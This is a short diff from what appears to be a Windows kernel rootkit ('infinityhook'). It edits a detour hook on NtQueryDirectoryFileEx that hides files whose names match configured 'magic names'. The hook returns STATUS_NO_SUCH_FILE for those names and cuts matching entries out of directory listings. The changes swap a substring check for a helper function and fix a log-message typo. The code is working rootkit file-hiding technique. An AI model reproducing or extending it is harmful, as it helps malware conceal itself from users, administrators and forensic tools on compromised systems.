@@ -45,7 +45,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
 				TempBuffer[i] = FileName->Buffer[i];
 			}
-			if (wcsstr(TempBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+			if (matchMagicNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is used in tab-autocomplete filename
 				return STATUS_NO_SUCH_FILE;
 			}
 		}
@@ -61,7 +61,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hid: %ws\n", FileNameBuffer);
+					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
